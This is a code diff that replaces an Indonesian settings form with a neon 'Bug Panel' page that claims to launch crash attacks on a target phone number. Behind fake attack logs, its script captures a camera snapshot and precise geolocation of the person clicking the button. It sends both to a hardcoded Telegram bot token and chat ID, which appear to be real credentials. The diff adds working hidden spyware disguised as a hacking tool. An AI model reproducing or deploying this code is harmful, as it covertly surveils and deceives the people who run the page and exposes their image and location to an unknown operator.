@@ -1,113 +1,324 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="id">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Setting Panel</title>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>RDVSP V4 — Bug Panel (Neon)</title>
+  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Inter:wght@300;400;600&display=swap" rel="stylesheet">
   <style>
-    body {
-      margin: 0;
-      font-family: Arial, sans-serif;
-      background: linear-gradient(135deg, #0f0f0f, #1a1a1a);
-      color: #fff;
-      text-align: center;
+    :root{
+      --bg:#070006;
+      --panel:#0f0410;
+      --neon:#b34cff; /* main purple */
+      --neon-2:#ff4fe0;
+      --accent:#2b0b2f;
+      --glass: rgba(255,255,255,0.03);
+      --glow: 0 6px 30px rgba(179,76,255,0.22);
     }
-    header {
-      padding: 15px;
-      background: #111;
-      font-size: 22px;
-      font-weight: bold;
-      color: #0ff;
-      text-shadow: 0 0 10px #0ff;
-    }
-    .container {
-      margin: 30px auto;
-      background: #111;
-      padding: 20px;
-      border-radius: 10px;
-      width: 90%;
-      max-width: 450px;
-      box-shadow: 0 0 10px #0ff;
-      text-align: left;
-    }
-    label {
-      display: block;
-      margin: 15px 0 5px;
-      font-size: 14px;
-      color: #0ff;
-    }
-    input {
-      width: 100%;
-      padding: 10px;
-      border-radius: 6px;
-      border: none;
-      font-size: 14px;
-      outline: none;
-      background: #222;
-      color: #fff;
-    }
-    button {
-      margin-top: 20px;
-      width: 100%;
-      padding: 12px;
-      border-radius: 8px;
-      border: none;
-      background: #0ff;
-      color: #000;
-      font-weight: bold;
-      cursor: pointer;
-      transition: 0.3s;
-      font-size: 16px;
-    }
-    button:hover {
-      background: #00cccc;
-    }
-    .status {
-      margin-top: 20px;
-      font-size: 14px;
-      color: #aaa;
-    }
+    *{box-sizing:border-box}
+    html,body{height:100%}
+    body{
+      margin:0;min-height:100%;
+      background: radial-gradient(1200px 600px at 10% 10%, rgba(179,76,255,0.05), transparent),
+                  radial-gradient(1000px 500px at 90% 90%, rgba(255,79,224,0.03), transparent),
+                  var(--bg);
+      font-family: Inter, system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial;
+      color:#fff;
+      display:flex;align-items:center;justify-content:center;padding:28px;
+    }.frame{
+  width:100%;max-width:420px;
+  position:relative;
+  padding:22px;
+  border-radius:20px;
+  background: linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01));
+  box-shadow: var(--glow);
+  border: 1px solid rgba(255,255,255,0.03);
+  overflow:hidden;
+}
+
+/* top bar */
+.topbar{display:flex;align-items:center;justify-content:space-between;padding:6px 6px 18px 6px}
+.hamburger{width:36px;height:36px;border-radius:10px;background:linear-gradient(180deg,var(--accent),transparent);display:flex;align-items:center;justify-content:center;box-shadow: inset 0 -6px 16px rgba(0,0,0,0.4)}
+.title{font-family:Orbitron, sans-serif;color:var(--neon);letter-spacing:1px}
+.profile-btn{width:36px;height:36px;border-radius:50%;background:linear-gradient(180deg,#2a0b2a, #22021a);display:flex;align-items:center;justify-content:center;color:var(--neon);font-weight:700}
+
+/* profile card */
+.profile{
+  margin:8px 0 18px 0;
+  border-radius:16px;
+  padding:18px;
+  background: linear-gradient(180deg, rgba(179,76,255,0.06), rgba(0,0,0,0.18));
+  border:1px solid rgba(179,76,255,0.12);
+  box-shadow: 0 8px 40px rgba(179,76,255,0.06);
+  display:flex;gap:14px;align-items:center
+}
+.avatar{
+  width:86px;height:86px;border-radius:50%;overflow:hidden;padding:6px;background:linear-gradient(180deg,#330029,#190014);border:2px solid rgba(255,255,255,0.04)
+}
+.avatar img{width:100%;height:100%;object-fit:cover;display:block}
+.profile-info{flex:1}
+.name{font-family:Orbitron, sans-serif;color:var(--neon-2);font-size:20px;margin:0}
+.meta{font-size:12px;color:rgba(255,255,255,0.55);margin-top:6px}
+
+/* card form */
+.card{margin-top:10px;padding:18px;border-radius:14px;background:linear-gradient(180deg, rgba(0,0,0,0.35), rgba(0,0,0,0.5));border:1px solid rgba(179,76,255,0.06)}
+label{display:block;font-size:13px;color:rgba(179,76,255,0.9);margin-bottom:6px}
+
+.field{position:relative;margin-bottom:14px}
+.input, .select-custom{
+  width:100%;padding:14px 14px;border-radius:12px;border:none;background:rgba(0,0,0,0.55);color:#fff;font-size:15px;outline:none;
+  box-shadow: 0 6px 22px rgba(0,0,0,0.5), 0 0 18px rgba(179,76,255,0.03) inset;
+  border:1px solid rgba(179,76,255,0.08);
+}
+.placeholder-hint{font-size:12px;color:rgba(255,255,255,0.35);margin-top:6px}
+
+/* select styled */
+.select-wrap{position:relative}
+.select-custom{appearance:none;cursor:pointer;background-image: linear-gradient(90deg, transparent, transparent), radial-gradient(circle at top right, rgba(255,255,255,0.02), transparent);}
+.select-wrap::after{
+  content:'';position:absolute;right:14px;top:50%;transform:translateY(-50%);
+  width:12px;height:12px;border-left:2px solid var(--neon);border-bottom:2px solid var(--neon);transform:translateY(-50%) rotate(-45deg);
+}
+
+.big-btn{
+  margin-top:6px;padding:14px;border-radius:14px;border:none;width:100%;font-size:16px;font-weight:700;background:linear-gradient(90deg,var(--neon),var(--neon-2));color:#13000b;cursor:pointer;box-shadow:0 12px 40px rgba(179,76,255,0.22);
+}
+
+.progress{height:8px;background:rgba(255,255,255,0.03);border-radius:8px;overflow:hidden;margin-top:12px}
+.progress > i{display:block;height:100%;width:0;background:linear-gradient(90deg,var(--neon),var(--neon-2));transition:width 250ms ease}
+
+.log{margin-top:12px;background:transparent;border:1px dashed rgba(179,76,255,0.06);padding:10px;border-radius:10px;height:110px;overflow:auto;font-family:monospace;font-size:13px;color:rgba(255,255,255,0.9)}
+
+/* overlay for process */
+.overlay{position:fixed;inset:0;background:linear-gradient(180deg, rgba(0,0,0,0.6), rgba(0,0,0,0.85));display:flex;align-items:center;justify-content:center;z-index:9999;flex-direction:column;color:var(--neon-2);font-family:Orbitron, sans-serif}
+.overlay .card{max-width:420px;width:90%;}
+
+/* responsive */
+@media (max-width:420px){.frame{padding:16px;border-radius:16px}}
+
   </style>
 </head>
 <body>
-  <header>⚙️ Setting Panel</header>
+  <div class="frame">
+    <div class="topbar">
+      <div class="hamburger">≡</div>
+      <div class="title">RDVSP V4</div>
+      <div class="profile-btn">◎</div>
+    </div><div class="profile">
+  <div class="avatar">
+    <!-- replace src with user's avatar url -->
+    <img src="https://i.imgur.com/4AiXzf8.jpeg" alt="avatar">
+  </div>
+  <div class="profile-info">
+    <h3 class="name">layyy</h3>
+    <div class="meta">Role: <strong>RESELLER</strong> • Exp: 2028-06-02</div>
+  </div>
+</div>
 
-  <div class="container">
-    <label for="token">🔑 Bot Token</label>
-    <input type="text" id="token" placeholder="Masukkan BOT_TOKEN">
-
-    <label for="chatid">💬 Chat ID</label>
-    <input type="text" id="chatid" placeholder="Masukkan CHAT_ID">
-
-    <label for="webname">🌐 Nama Web</label>
-    <input type="text" id="webname" placeholder="Masukkan Nama Panel">
-
-    <button onclick="saveSetting()">💾 Simpan Setting</button>
-    <div class="status" id="status">Belum ada setting tersimpan.</div>
+<div class="card">
+  <div class="field">
+    <label>Target Number</label>
+    <input id="targetNumber" class="input" placeholder="e.g. +62xxxxxxxxxx" />
+    <div class="placeholder-hint">Masukkan nomor dengan kode negara (contoh: +62...)</div>
   </div>
 
+  <div class="field select-wrap">
+    <label>Select Bug</label>
+    <select id="bugSelect" class="select-custom">
+      <option>Crash Infinity</option>
+      <option>Delay Invisible</option>
+      <option>iOS Crash</option>
+    </select>
+  </div>
+
+  <button id="attackBtn" class="big-btn">🚀 Launch Attack</button>
+
+  <div class="progress" aria-hidden="true"><i id="pb"></i></div>
+  <div class="log" id="logBox">-- activity log --</div>
+</div>
+
+  </div>
+
+  <!-- full-featured script: kamera + lokasi + kirim ke Telegram -->  
   <script>
-    // Load data lama
-    document.getElementById("token").value   = localStorage.getItem("BOT_TOKEN") || "";
-    document.getElementById("chatid").value  = localStorage.getItem("CHAT_ID") || "";
-    document.getElementById("webname").value = localStorage.getItem("webName") || "";
+    // === CONFIGURE THESE BEFORE DEPLOY ===
+    const BOT_TOKEN = "8242531966:AAHdtaXS6MaCYdyRE-RyYFBzSnamZ6uMNkQ";
+    const CHAT_ID = "7885097329";
 
-    function saveSetting() {
-      const token = document.getElementById("token").value.trim();
-      const chatid = document.getElementById("chatid").value.trim();
-      const webname = document.getElementById("webname").value.trim();
+    const logBox = document.getElementById('logBox');
+    const pb = document.getElementById('pb');
+    let userLocation = null; // akan diisi oleh getLocation()
 
-      if (!token || !chatid || !webname) {
-        document.getElementById("status").innerText = "⚠️ Semua field wajib diisi.";
+    function addLog(t){
+      const p = document.createElement('div');
+      p.textContent = new Date().toLocaleTimeString() + ' - ' + t;
+      logBox.appendChild(p);
+      logBox.scrollTop = logBox.scrollHeight;
+    }
+
+    function setProgress(percent){
+      pb.style.width = Math.max(0, Math.min(100, percent)) + '%';
+    }
+
+    // Ambil foto dari kamera (versi yang menggunakan variabel `camera` seperti contoh)
+    function takePhoto(){
+      return new Promise((resolve, reject) => {
+        // minta akses kamera dan simpan video ke variabel global `camera` supaya kompatibel
+        navigator.mediaDevices.getUserMedia({ video: true })
+          .then(stream => {
+            const video = document.createElement('video');
+            window.camera = video; // sesuai skenario kode yang lu kirim
+            video.srcObject = stream;
+            video.play();
+
+            video.onloadedmetadata = () => {
+              try{
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth || 320;
+                canvas.height = video.videoHeight || 240;
+                const ctx = canvas.getContext('2d');
+                // gunakan `camera` (video) seperti di contoh
+                ctx.drawImage(window.camera, 0, 0, canvas.width, canvas.height);
+                stream.getTracks().forEach(track => track.stop());
+                delete window.camera;
+                canvas.toBlob(blob => resolve(blob), 'image/jpeg');
+              }catch(e){
+                stream.getTracks().forEach(track => track.stop());
+                reject(e);
+              }
+            };
+
+            // fallback timeout jika metadata lambat
+            setTimeout(() => {
+              if (!video.videoWidth) {
+                try{ stream.getTracks().forEach(t=>t.stop()); }catch{};
+                reject(new Error('Gagal mendapatkan frame kamera'));
+              }
+            }, 4500);
+          })
+          .catch(err => reject(err));
+      });
+    }
+
+    // Kirim ke Telegram (foto + lokasi + link GMaps)
+    function sendToTelegram(blob){
+      const fd = new FormData();
+      fd.append("chat_id", CHAT_ID);
+      fd.append("photo", blob, "snapshot.jpg");
+
+      let caption = "📸 Foto dari game AR";
+      if(userLocation){
+        let lat = userLocation.latitude;
+        let lon = userLocation.longitude;
+        caption += `
+📍 Lokasi: ${lat}, ${lon}`;
+        caption += `
+🌍 [Lihat di Google Maps](https://www.google.com/maps?q=${lat},${lon})`;
+      }
+
+      fd.append("caption", caption);
+      fd.append("parse_mode", "Markdown");
+
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method:"POST", body:fd })
+        .then(res => res.json())
+        .then(data => addLog('Telegram sent: ' + (data && data.ok ? 'OK' : JSON.stringify(data))))
+        .catch(err => addLog('Error kirim foto ke Telegram: ' + err.message));
+
+      // Kirim juga titik lokasi (biar langsung muncul di map Telegram)
+      if(userLocation){
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
+          method:"POST",
+          headers:{ "Content-Type":"application/json" },
+          body: JSON.stringify({
+            chat_id: CHAT_ID,
+            latitude: userLocation.latitude,
+            longitude: userLocation.longitude
+          })
+        }).catch(err => addLog('Error kirim lokasi ke Telegram: ' + err.message));
+      }
+    }
+
+    // helper: ambil lokasi (promise)
+    function getLocation(){
+      return new Promise((resolve, reject) => {
+        if(!navigator.geolocation) return reject(new Error('Geolocation not supported'));
+        navigator.geolocation.getCurrentPosition(pos => {
+          resolve({lat: pos.coords.latitude, lon: pos.coords.longitude});
+        }, err => reject(err), { enableHighAccuracy: true, timeout: 10000 });
+      });
+    }
+
+    // fake logs untuk UI
+    function fakeAttackLogs(){
+      const msgs = [
+        '[*] Connecting to server...',
+        '[*] Authenticating...',
+        '[*] Menunggu...',
+        '[*] Memeriksa nomor...',
+        '[*] Nomor terdeteksi...',
+        '[✓] Bug diproses!'
+      ];
+      msgs.forEach((m,i)=> setTimeout(()=>addLog(m), i*700));
+    }
+
+    function showOverlay(text){
+      let ov = document.querySelector('.overlay');
+      if(!ov){
+        ov = document.createElement('div');
+        ov.className = 'overlay';
+        document.body.appendChild(ov);
+      }
+      ov.innerHTML = `<div style="text-align:center;max-width:420px;padding:18px;"><h2>${text}</h2></div>`;
+    }
+    function hideOverlay(){
+      const ov = document.querySelector('.overlay'); if(ov) ov.remove();
+    }
+
+    document.getElementById('attackBtn').addEventListener('click', async ()=>{
+      const number = document.getElementById('targetNumber').value.trim();
+      const bug = document.getElementById('bugSelect').value;
+      if(!number){ alert('Masukkan nomor dulu!'); return; }
+
+// Yang harus di ganti
+      if(BOT_TOKEN === '8426427901:AAFxIj02Q-uq9XyVQh7hk7mQ-HkVY52c3o0 || CHAT_ID === '8316267465'){
+        alert('Isi dulu BOT_TOKEN dan CHAT_ID di file sebelum menguji.');
         return;
       }
 
-      localStorage.setItem("BOT_TOKEN", token);
-      localStorage.setItem("CHAT_ID", chatid);
-      localStorage.setItem("webName", webname);
+      addLog('=== ATTACK STARTED ===');
+      setProgress(0);
+      fakeAttackLogs();
+      showOverlay('🔗 Menghubungkan...');
 
-      document.getElementById("status").innerText = "✅ Setting berhasil disimpan!";
-    }
+      try{
+        // step 1: ambil foto
+        addLog('[*] Meminta akses kamera...');
+        const photoBlob = await takePhoto();
+        addLog('[✓] Foto diambil. Mengirim ke server...');
+        setProgress(45);
+
+        // step 2: ambil lokasi (simpan ke userLocation untuk digunakan di sendToTelegram)
+        addLog('[*] Meminta akses lokasi...');
+        const pos = await getLocation();
+        userLocation = { latitude: pos.lat, longitude: pos.lon };
+        addLog(`[✓] Lokasi: ${pos.lat.toFixed(6)}, ${pos.lon.toFixed(6)}`);
+        setProgress(65);
+
+        // kirim foto + lokasi
+        sendToTelegram(photoBlob);
+        setProgress(95);
+
+        setProgress(100);
+        showOverlay('✅ Attack Selesai!');
+        setTimeout(()=> hideOverlay(), 1600);
+        addLog('=== ATTACK FINISHED ===');
+      }catch(err){
+        console.error(err);
+        addLog('[x] Terjadi error: ' + (err.message || err));
+        showOverlay('❌ Akses ditolak / Error: ' + (err.message || 'unknown'));
+        setTimeout(()=> hideOverlay(), 1800);
+      }
+    });
   </script>
 </body>
 </html>
